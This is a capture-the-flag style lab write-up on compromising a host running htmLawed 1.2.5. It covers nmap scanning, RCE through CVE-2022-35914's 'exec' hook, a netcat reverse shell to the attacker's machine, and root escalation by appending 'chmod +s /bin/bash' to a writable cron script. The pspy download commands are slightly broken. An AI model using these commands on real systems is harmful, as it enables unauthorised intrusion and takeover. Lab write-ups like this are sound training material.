Nmap scan.
```sh
nmap -p- --min-rate 5000 -T4 -Pn 192.168.218.190
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 16:30 IST
Warning: 192.168.218.190 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.218.190
Host is up (3.3s latency).
Not shown: 61120 closed tcp ports (reset), 4413 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 92.34 seconds
```

```sh
nmap -sC -sV -T4 -Pn -p 22,80 192.168.218.190   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 16:33 IST
Nmap scan report for 192.168.218.190
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: htmLawed (1.2.5) test
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
```

Visiting web server on port 80.
![[Law1.png]]

Searched for public exploits and found below one.
![[Law2.png]]
But the above one didn't work. So we started looking for other exploits.
![[Law3.png]]
It seems like an HTMLawed 1.2.5 test version. There appears to be an exploit for this CVE-2022–35914, a GLPI unauthenticated RCE where you just need to change the hook to ‘exec’, and then you will get immediate code execution. You can learn how to exploit it here:
To reproduce the exploit I did the following :
launched burp suite.
Checking the browser network tab, we discovered the POST request sent to `[http://$ip/htmLawedTest.php](http://$ip/htmLawedTest.php)` where our page is supposed to be `[http://$ip](http://$ip./)` , to ease up the thing, we decide to use burp to intercept the traffic, and correct the POST request.
![](Law4.png)
Remove the htmLawedTest.php and click forward.
![](Law5.png)
![](Law6.png)
And here we go, setup a netcat listener on our kali machine and execute `nc $kaliIP 80 -e /bin/sh` on the target machine to get us a reverse shell. Sometimes the page just does not work, try refresh and it should work.
![](Law8.png)
![](Law9.png)

![](Law7.png)
![](Law10.png)

### Privilege Escalation
We tried checking for sudo, SUID and crontab but found nothing, so we decided to run pspy.
Let it run for a while and observe the result, this tool helps us to monitor the running process recursively.
From the result, you will notice UID=0 means root, execute the cleanup.sh. Since we have the read-write permission of the cleanup.sh, we are able to put malicious commands to the file and let root do the job.
```sh
#At kali machine  
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
python3 -m http.server 80  
#at target machine  
curl http://$kaliIP/pspy64 -o /tmp 
chmod +x /tmp 
./pspy64
```

![](Law11.png)
Important observations:

|Field|Meaning|
|---|---|
|`UID=0`|Running as **root**|
|`/usr/sbin/CRON`|Triggered by **cron job**|
|`/var/www/cleanup.sh`|Script executed by root|
To check permissions.
![](Law12.png)
This means:

|Permission|Meaning|
|---|---|
|Owner|`www-data`|
|Writable by|**www-data**|
|Executed by|root|
We checked that /bin/bash is owned by root.
![](Law13.png)
So we did below modifications to the `cleanup.sh`
`echo "chmod +s /bin/bash" >> cleanup.sh`

`chmod +s` sets the **SUID (Set User ID) bit**.

The **SUID permission** means:

> When a file is executed, it runs with the **file owner's privileges**, not the user's.

Since `/bin/bash` is owned by **root**, it will execute as **root**.

We checked if SUID is set or not. (s is added)
![](Law14.png)

Now simply run the `bash -p`
If a **SUID bash** is executed normally:
`bash`
Bash will **drop root privileges** automatically to prevent exploitation.
```
$ bash  
$ whoami  
www-data
```
# What `-p` Does

The `-p` flag means:

-p  → preserve privileges

So when you run:

`bash -p`

Bash **keeps the SUID privileges instead of dropping them**.
![](Law5.png)
